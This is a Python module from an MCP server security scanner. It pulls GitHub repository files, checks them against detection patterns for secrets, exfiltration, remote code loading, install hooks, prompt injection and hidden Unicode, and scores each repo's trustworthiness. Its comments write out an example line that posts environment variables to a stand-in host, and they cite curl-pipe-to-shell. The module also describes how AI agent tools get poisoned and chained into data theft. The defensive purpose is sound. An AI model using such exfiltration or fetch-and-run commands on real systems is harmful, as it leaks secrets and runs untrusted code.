"""Core MCP server security scanner.

Fetches source files from GitHub repos and scans for security issues.
"""
from __future__ import annotations

import json
import logging
import re
from dataclasses import dataclass, field
from pathlib import Path

import httpx

from mcp_security_scan.patterns import (
    AGENT_METADATA_FILES,
    AUTH_POSITIVE_PATTERNS,
    DYNAMIC_REMOTE_LOAD_PATTERNS,
    EXEC_SINK_RE,
    EXFILTRATION_PATTERNS,
    FILE_READ_RE,
    FS_ACCESS_PATTERNS,
    INSECURE_DESERIALIZATION_PATTERNS,
    INSTALL_SCRIPT_DANGER_RE,
    INVISIBLE_UNICODE_PATTERNS,
    MANIFEST_EXEC_PATTERNS,
    NET_READ_RE,
    NPM_INSTALL_HOOKS,
    OBFUSCATION_PATTERNS,
    OUTBOUND_SEND_RE,
    PROMPT_INJECTION_PATTERNS,
    SECRET_PATTERNS,
    SENSITIVE_READ_RE,
    SKIP_DIRS,
    SKIP_EXTENSIONS,
    SOURCE_EXTENSIONS,
    UNSAFE_EXEC_PATTERNS,
    UNTRUSTED_INPUT_RE,
)

logger = logging.getLogger(__name__)

_TIMEOUT = 20
_MAX_FILE_SIZE = 500_000  # 500KB
_MAX_FILES_PER_REPO = 200


@dataclass
class Finding:
    """A single security finding."""

    category: str  # "secret", "unsafe_exec", "fs_access"
    name: str
    severity: str  # "critical", "high", "medium", "low", "info"
    file_path: str
    line_number: int
    snippet: str


@dataclass
class ScanResult:
    """Result of scanning one repository."""

    repo: str
    stars: int = 0
    description: str = ""
    framework: str = ""
    findings: list[Finding] = field(default_factory=list)
    positive_signals: list[str] = field(default_factory=list)
    files_scanned: int = 0
    # Coverage disclosure (#4): total scannable files BEFORE the _MAX_FILES_PER_REPO cap,
    # and whether the grade is only a sample of the repo — so a partial-coverage grade is
    # never presented as an authoritative whole-repo verdict.
    total_scannable_files: int = 0
    sampled: bool = False
    has_readme: bool = False
    has_license: bool = False
    has_tests: bool = False
    primary_language: str = ""
    trust_score: int = 0
    error: str | None = None

    @property
    def critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == "critical")

    @property
    def high_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == "high")

    @property
    def medium_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == "medium")


def _should_skip_path(path: str) -> bool:
    """Check if a file path should be skipped."""
    parts = Path(path).parts
    for part in parts:
        if part in SKIP_DIRS:
            return True
    ext = Path(path).suffix.lower()
    if ext in SKIP_EXTENSIONS:
        return True
    name = Path(path).name.lower()
    if ".min." in name:
        return True
    return False


def _is_source_file(path: str) -> bool:
    """Check if a file should be scanned for source patterns."""
    # Agent/tool metadata (SKILL.md, mcp.json, …) IS the tool's instruction
    # surface — always scan it, even if the extension isn't source-like.
    if Path(path).name.lower() in AGENT_METADATA_FILES:
        return True
    ext = Path(path).suffix.lower()
    return ext in SOURCE_EXTENSIONS


def _is_test_or_doc_file(file_path: str) -> bool:
    """Check if a file is a test, doc, or example file (lower severity)."""
    lower = file_path.lower()
    parts = Path(file_path).parts
    if any(p in ("tests", "test", "spec", "__tests__", "testing") for p in parts):
        return True
    name = Path(file_path).stem.lower()
    if name.startswith("test_") or name.endswith("_test") or name.endswith("_spec"):
        return True
    if name == "conftest":
        return True
    if any(p in ("docs", "doc", "examples", "example", "samples") for p in parts):
        return True
    if ".example" in lower or ".sample" in lower or ".template" in lower:
        return True
    return False


def _is_infra_file(file_path: str) -> bool:
    """#3 — CI/infra config, graded like tests/docs (not shipped code).

    Dockerfiles, `.github/**` / `.gitlab/**` workflow YAMLs, and agent skill configs
    (`.agents/**`) legitimately contain `RUN curl | sh`, pipe-to-shell, etc. Their
    findings are DOWNGRADED (same as tests/docs) so a single CI recipe can't produce
    the critical that zeroes an otherwise-clean repo's grade.
    """
    parts = Path(file_path).parts
    if any(p in (".github", ".gitlab", ".agents", ".circleci", ".buildkite") for p in parts):
        return True
    name = Path(file_path).name
    lname = name.lower()
    if name == "Dockerfile" or name.startswith("Dockerfile.") or lname.endswith(".dockerfile"):
        return True
    # Common root-level CI config files
    if lname in (".gitlab-ci.yml", ".travis.yml", "azure-pipelines.yml", "cloudbuild.yaml"):
        return True
    # Workflow YAMLs (e.g. under a workflows/ directory)
    if any(p == "workflows" for p in parts) and lname.endswith((".yml", ".yaml")):
        return True
    return False


# --- Per-file language dispatch (#2) -----------------------------------------
# Language-SPECIFIC pattern groups must only run on files of that language, so Python
# `exec()` no longer fires on `.mjs` and Ruby `system`/backtick no longer fires on TS
# template literals. Language-AGNOSTIC groups (secrets, exfiltration, invisible unicode,
# prompt injection, obfuscation) keep running on every file.
_EXT_TO_LANG: dict[str, str] = {
    ".py": "python", ".ipynb": "python",
    ".js": "javascript", ".mjs": "javascript", ".cjs": "javascript", ".jsx": "javascript",
    ".ts": "typescript", ".tsx": "typescript",
    ".rb": "ruby",
    ".go": "go",
    ".rs": "rust",
    ".java": "java",
}

# A pattern's NAME carries its language tag (e.g. "(Python)", "(Node.js)"); map those
# tags to the file-languages they apply to. Node runs both JS and TS.
_PATTERN_LANG_TAGS: list[tuple[str, frozenset]] = [
    ("python", frozenset({"python"})),
    ("node", frozenset({"javascript", "typescript"})),
    ("(js)", frozenset({"javascript", "typescript"})),
    ("ruby", frozenset({"ruby"})),
    ("(go)", frozenset({"go"})),
    ("rust", frozenset({"rust"})),
    ("java", frozenset({"java"})),
]


def _required_langs(pattern_name: str) -> frozenset:
    """Languages a pattern targets, inferred from its name. Empty = language-agnostic."""
    lname = pattern_name.lower()
    langs: set = set()
    for tag, mapped in _PATTERN_LANG_TAGS:
        if tag in lname:
            langs |= mapped
    return frozenset(langs)


def _lang_ok(pattern_name: str, file_lang: str | None) -> bool:
    """True if a (possibly language-specific) pattern should run on this file.

    Patterns whose name has no language tag are agnostic → always run. A tagged
    pattern runs only when the file's detected language is one it targets.
    """
    required = _required_langs(pattern_name)
    if not required:
        return True
    if file_lang is None:
        return False
    return file_lang in required


def _redact_secret(line: str, match: re.Match) -> str:  # type: ignore[type-arg]
    """Redact the actual secret value from the snippet."""
    start, end = match.span()
    matched = match.group()
    if len(matched) > 12:
        redacted = matched[:4] + "..." + matched[-4:]
    else:
        redacted = matched[:2] + "***"
    return line[:start] + redacted + line[end:]


def _detect_language(files: list[dict]) -> str:
    """Detect primary language from file extensions.

    #5 — only counts *real programming-language* extensions (the keys of ``lang_map``);
    config/data files (.json/.yaml/.toml/.ini/…) are NOT languages, so a TypeScript repo
    full of package.json/tsconfig.json no longer reports its primary language as ".json".
    """
    lang_map = {
        ".py": "Python", ".ipynb": "Python",
        ".js": "JavaScript", ".mjs": "JavaScript", ".cjs": "JavaScript",
        ".jsx": "JavaScript",
        ".ts": "TypeScript", ".tsx": "TypeScript",
        ".go": "Go", ".rs": "Rust", ".rb": "Ruby",
        ".java": "Java", ".kt": "Kotlin", ".cs": "C#",
        ".php": "PHP", ".swift": "Swift", ".scala": "Scala",
        ".lua": "Lua", ".pl": "Perl", ".pm": "Perl", ".r": "R",
        ".groovy": "Groovy",
        ".sh": "Shell", ".bash": "Shell", ".zsh": "Shell",
    }
    ext_counts: dict[str, int] = {}
    for f in files:
        ext = Path(f.get("path", "")).suffix.lower()
        if ext in lang_map:
            ext_counts[ext] = ext_counts.get(ext, 0) + 1

    if not ext_counts:
        return "unknown"
    top_ext = max(ext_counts, key=ext_counts.get)  # type: ignore[arg-type]
    return lang_map[top_ext]


async def _fetch_repo_tree(
    owner: str, repo: str, token: str | None = None,
) -> list[dict]:
    """Fetch the file tree of a repo via GitHub API."""
    headers = {"Accept": "application/vnd.github+json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    async with httpx.AsyncClient(timeout=_TIMEOUT) as client:
        resp = await client.get(
            f"https://api.github.com/repos/{owner}/{repo}",
            headers=headers,
        )
        if resp.status_code != 200:
            return []
        default_branch = resp.json().get("default_branch", "main")

        resp = await client.get(
            f"https://api.github.com/repos/{owner}/{repo}/git/trees/{default_branch}",
            headers=headers,
            params={"recursive": "1"},
        )
        if resp.status_code != 200:
            return []

        tree = resp.json().get("tree", [])
        return [
            item for item in tree
            if item.get("type") == "blob"
            and item.get("size", 0) <= _MAX_FILE_SIZE
        ]


async def _fetch_file_content(
    owner: str, repo: str, path: str, token: str | None = None,
) -> str | None:
    """Fetch raw file content from GitHub."""
    headers = {"Accept": "application/vnd.github.raw+json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    async with httpx.AsyncClient(timeout=_TIMEOUT) as client:
        resp = await client.get(
            f"https://api.github.com/repos/{owner}/{repo}/contents/{path}",
            headers=headers,
        )
        if resp.status_code == 200:
            return resp.text
    return None


def _scan_content(
    content: str, file_path: str,
) -> tuple[list[Finding], list[str]]:
    """Scan file content for security issues and positive signals."""
    findings: list[Finding] = []
    positives: list[str] = []

    is_test_or_doc = _is_test_or_doc_file(file_path)
    # CI/infra files (#3) are graded like tests/docs so a Dockerfile / workflow recipe
    # can't dominate the grade with a critical.
    is_infra = _is_infra_file(file_path)
    # Findings in tests/docs/infra are downgraded.
    is_downgraded = is_test_or_doc or is_infra
    # Per-file language for language-specific pattern dispatch (#2).
    file_lang = _EXT_TO_LANG.get(Path(file_path).suffix.lower())
    # Manifest / skill files ARE the tool's instruction surface — never downgrade
    # prompt-injection / hidden-unicode there even if they look doc-ish.
    is_metadata = Path(file_path).name.lower() in AGENT_METADATA_FILES
    lines = content.split("\n")

    for line_num, line in enumerate(lines, 1):
        stripped = line.strip()
        if stripped.startswith(("#", "//", "*", "/*")):
            continue
        # NOTE (#6): we deliberately do NOT skip an entire line just because it contains
        # the word "example"/"placeholder" — that let an attacker neutralize any rule with
        # `# example` and silently ignored real code like
        # `requests.post("https://example.com/collect", data=os.environ)`. Placeholder
        # handling is now scoped to the matched secret VALUE only (see the secret loop).

        # Check secrets
        for name, pattern, severity in SECRET_PATTERNS:
            match = pattern.search(line)
            if match:
                if ".example" in file_path or "test" in file_path.lower():
                    continue
                # Skip if the MATCHED VALUE is clearly a placeholder (not the whole line).
                # The captured secret value (group 1 when present, else the full match).
                val = match.group(1) if match.groups() else match.group()
                val_lower = val.lower()
                if val in ("YOUR_API_KEY", "your_api_key", "xxx", "changeme") or any(
                    tok in val_lower for tok in ("example", "placeholder", "your_api_key")
                ):
                    continue
                findings.append(Finding(
                    category="secret",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=_redact_secret(stripped[:120], match),
                ))
                break

        # Check unsafe exec
        for name, pattern, severity in UNSAFE_EXEC_PATTERNS:
            if pattern.search(line):
                # Language dispatch (#2): skip a language-specific pattern on a
                # non-matching file (e.g. Python exec() on a .mjs file).
                if not _lang_ok(name, file_lang):
                    continue
                effective_severity = severity
                if is_downgraded and severity in ("critical", "high"):
                    effective_severity = "medium"
                findings.append(Finding(
                    category="unsafe_exec",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check file system access
        for name, pattern, severity in FS_ACCESS_PATTERNS:
            if pattern.search(line):
                # Language dispatch (#2)
                if not _lang_ok(name, file_lang):
                    continue
                effective_severity = severity
                if is_downgraded and severity in ("critical", "high"):
                    effective_severity = "medium"
                findings.append(Finding(
                    category="fs_access",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check data exfiltration (language-agnostic — always runs)
        for name, pattern, severity in EXFILTRATION_PATTERNS:
            if pattern.search(line):
                findings.append(Finding(
                    category="exfiltration",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check obfuscation (language-agnostic — always runs)
        for name, pattern, severity in OBFUSCATION_PATTERNS:
            if pattern.search(line):
                findings.append(Finding(
                    category="obfuscation",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check insecure deserialization — RCE class
        for name, pattern, severity in INSECURE_DESERIALIZATION_PATTERNS:
            if pattern.search(line):
                # Language dispatch (#2)
                if not _lang_ok(name, file_lang):
                    continue
                effective_severity = severity
                if is_downgraded and severity in ("critical", "high"):
                    effective_severity = "medium"
                findings.append(Finding(
                    category="insecure_deserialization",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check dynamic remote payload / rug-pull (external-URL-swap)
        for name, pattern, severity in DYNAMIC_REMOTE_LOAD_PATTERNS:
            if pattern.search(line):
                # Language dispatch (#2) — untagged patterns (e.g. curl|sh) stay agnostic.
                if not _lang_ok(name, file_lang):
                    continue
                effective_severity = severity
                if is_downgraded and severity in ("critical", "high"):
                    effective_severity = "medium"
                findings.append(Finding(
                    category="dynamic_remote_load",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check invisible / smuggled Unicode (dangerous anywhere — no downgrade)
        for name, pattern, severity in INVISIBLE_UNICODE_PATTERNS:
            if pattern.search(line):
                findings.append(Finding(
                    category="hidden_unicode",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check prompt injection / tool-description poisoning
        for name, pattern, severity in PROMPT_INJECTION_PATTERNS:
            if pattern.search(line):
                # Downgrade in test/doc/infra files — EXCEPT manifest/skill
                # metadata, which is the actual attack surface.
                effective_severity = severity
                if is_downgraded and not is_metadata and severity in ("critical", "high"):
                    effective_severity = "medium"
                findings.append(Finding(
                    category="prompt_injection",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

    # Split fetch->exec across lines: a network read + an exec sink co-occurring in
    # one file is the classic rug-pull loader the per-line scan can't see. Fire only
    # when they're within ~40 lines of each other (keeps the composite finding tight).
    if not is_downgraded and NET_READ_RE.search(content) and EXEC_SINK_RE.search(content):
        net_lines = [i for i, ln in enumerate(lines) if NET_READ_RE.search(ln)]
        exec_lines = [i for i, ln in enumerate(lines) if EXEC_SINK_RE.search(ln)]
        if net_lines and exec_lines and any(
            abs(n - e) <= 40 for n in net_lines for e in exec_lines
        ):
            findings.append(Finding(
                category="dynamic_remote_load",
                name="Remote fetch + dynamic exec in same file (possible rug-pull)",
                severity="high",
                file_path=file_path,
                line_number=min(net_lines) + 1,
                snippet="network read + exec sink co-occur — remote payload may be swappable",
            ))

    # Manifest command/args rug-pull (MCPoison, CVE-2025-54136) — structural
    if is_metadata and Path(file_path).name.lower().endswith(".json"):
        findings.extend(_scan_manifest_exec(content, file_path))

    # Toxic-flow / lethal-trifecta composition — whole-file capability co-occurrence
    findings.extend(_composite_findings(content, file_path, lines, is_downgraded))

    # npm install hooks — auto-run on `npm install` (supply-chain entry point)
    if Path(file_path).name.lower() == "package.json":
        findings.extend(_scan_install_hooks(content, file_path))

    # Check positive signals (once per file)
    for name, pattern in AUTH_POSITIVE_PATTERNS:
        if pattern.search(content):
            positives.append(name)

    return findings, positives


def _iter_command_specs(node):
    """Yield every {command, args} object nested anywhere in a parsed manifest."""
    if isinstance(node, dict):
        if isinstance(node.get("command"), str):
            args = node.get("args")
            args_str = " ".join(str(a) for a in args) if isinstance(args, list) else ""
            yield f"{node['command']} {args_str}".strip()
        for value in node.values():
            yield from _iter_command_specs(value)
    elif isinstance(node, list):
        for value in node:
            yield from _iter_command_specs(value)


def _scan_manifest_exec(content: str, file_path: str) -> list[Finding]:
    """Inspect an MCP manifest's command/args for rug-pull exec (CVE-2025-54136).

    A mutable mcp.json/server.json whose command launches an inline interpreter-eval
    or pipes a remote fetch to a shell is the MCPoison vector: the client re-reads the
    file, so a swapped command runs on re-launch. Structural (parses JSON), not per-line.
    """
    findings: list[Finding] = []
    try:
        data = json.loads(content)
    except (ValueError, TypeError):
        return findings
    seen: set[tuple[str, str]] = set()
    for command_line in _iter_command_specs(data):
        for name, pattern, severity in MANIFEST_EXEC_PATTERNS:
            if pattern.search(command_line):
                if (name, command_line) in seen:
                    continue
                seen.add((name, command_line))
                findings.append(Finding(
                    category="dynamic_remote_load",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=1,
                    snippet=command_line[:120],
                ))
                break  # one finding per command spec
    return findings


def _scan_install_hooks(content: str, file_path: str) -> list[Finding]:
    """Flag npm pre/post/install lifecycle scripts (a top supply-chain vector).

    These run automatically on `npm install`. Presence alone is a medium signal;
    a hook that fetches/pipes-to-shell/evals is escalated to critical.
    """
    findings: list[Finding] = []
    try:
        data = json.loads(content)
    except (ValueError, TypeError):
        return findings
    scripts = data.get("scripts") if isinstance(data, dict) else None
    if not isinstance(scripts, dict):
        return findings
    for hook in NPM_INSTALL_HOOKS:
        cmd = scripts.get(hook)
        if not isinstance(cmd, str) or not cmd.strip():
            continue
        if INSTALL_SCRIPT_DANGER_RE.search(cmd):
            severity, label = "critical", "runs remote/shell/eval content"
        else:
            severity, label = "medium", "auto-runs on install"
        findings.append(Finding(
            category="install_hook",
            name=f"npm '{hook}' lifecycle script ({label})",
            severity=severity,
            file_path=file_path,
            line_number=1,
            snippet=f"{hook}: {cmd}"[:120],
        ))
    return findings


def _composite_findings(
    content: str,
    file_path: str,
    lines: list[str],
    is_downgraded: bool,
) -> list[Finding]:
    """The lethal trifecta: private-data read + untrusted input + outbound send.

    Each capability is benign alone; together in one tool they form the
    prompt-injection → exfiltration chain. We require ALL THREE legs present to
    keep precision high — a pure API wrapper that reads an env key and posts to
    one endpoint, with no untrusted-content ingestion, does NOT trigger.
    Emits at most one finding per file.
    """
    if not (
        UNTRUSTED_INPUT_RE.search(content)
        and OUTBOUND_SEND_RE.search(content)
        and (SENSITIVE_READ_RE.search(content) or FILE_READ_RE.search(content))
    ):
        return []

    def _hits(rx: re.Pattern[str]) -> list[int]:
        out = []
        for i, ln in enumerate(lines):
            stripped = ln.strip()
            if not stripped or stripped.startswith(("#", "//", "*", "/*")):
                continue
            if rx.search(ln):
                out.append(i + 1)
        return out

    untrusted = _hits(UNTRUSTED_INPUT_RE)
    outbound = _hits(OUTBOUND_SEND_RE)
    sensitive = _hits(SENSITIVE_READ_RE)
    file_read = _hits(FILE_READ_RE)
    if not (untrusted and outbound and (sensitive or file_read)):
        return []

    if sensitive:
        name = "Lethal trifecta: private-data read + untrusted input + outbound network"
        severity = "high"
        line = sensitive[0]
    else:
        name = "Toxic flow: file read + untrusted input + outbound network"
        severity = "medium"
        line = file_read[0]

    if is_downgraded and severity in ("critical", "high"):
        severity = "medium"

    return [Finding(
        category="toxic_flow",
        name=name,
        severity=severity,
        file_path=file_path,
        line_number=line,
        snippet="capability composition — each part benign alone, dangerous together",
    )]


def _calculate_trust_score(result: ScanResult) -> int:
    """Calculate a trust score (0-100) based on findings and signals."""
    score = 70

    score -= result.critical_count * 15
    score -= result.high_count * 8
    score -= result.medium_count * 3

    unique_positives = set(result.positive_signals)
    score += len(unique_positives) * 5

    if result.has_readme:
        score += 5
    if result.has_license:
        score += 5
    if result.has_tests:
        score += 5

    return max(0, min(100, score))


async def scan_repo(
    full_name: str,
    stars: int = 0,
    description: str = "",
    framework: str = "",
    token: str | None = None,
) -> ScanResult:
    """Scan a single GitHub repo for security issues.

    Args:
        full_name: "owner/repo" format
        stars: star count (for metadata)
        description: repo description
        framework: detected framework
        token: GitHub API token (optional but recommended)

    Returns:
        ScanResult with findings and trust score
    """
    result = ScanResult(
        repo=full_name,
        stars=stars,
        description=description,
        framework=framework,
    )

    parts = full_name.split("/")
    if len(parts) != 2:
        result.error = f"Invalid repo name: {full_name}"
        return result

    owner, repo = parts

    try:
        tree = await _fetch_repo_tree(owner, repo, token)
        if not tree:
            result.error = "Could not fetch repo tree (may be empty or private)"
            return result

        result.primary_language = _detect_language(tree)

        for item in tree:
            path_lower = item["path"].lower()
            if path_lower.startswith("readme"):
                result.has_readme = True
            if path_lower.startswith("license") or path_lower.startswith("licence"):
                result.has_license = True
            if "test" in path_lower or "spec" in path_lower:
                result.has_tests = True

        scannable_files = [
            item for item in tree
            if not _should_skip_path(item["path"])
            and _is_source_file(item["path"])
        ]
        # Coverage disclosure (#4): record the full scannable count BEFORE the cap, and
        # flag when the grade is only a sample of the repo (more scannable files than the
        # per-repo cap), so a partial-coverage grade is never presented as authoritative.
        result.total_scannable_files = len(scannable_files)
        result.sampled = result.total_scannable_files > _MAX_FILES_PER_REPO
        scan_files = scannable_files[:_MAX_FILES_PER_REPO]

        for item in scan_files:
            path = item["path"]
            content = await _fetch_file_content(owner, repo, path, token)
            # #7 — a failed/empty fetch must NOT inflate files_scanned; only count a file
            # once it was actually fetched AND scanned, so the reported coverage is real.
            if not content:
                continue

            result.files_scanned += 1
            findings, positives = _scan_content(content, path)
            result.findings.extend(findings)
            result.positive_signals.extend(positives)

        result.trust_score = _calculate_trust_score(result)

    except httpx.TimeoutException:
        result.error = "Request timed out"
    except Exception as exc:
        result.error = str(exc)
        logger.exception("Error scanning %s", full_name)

    return result
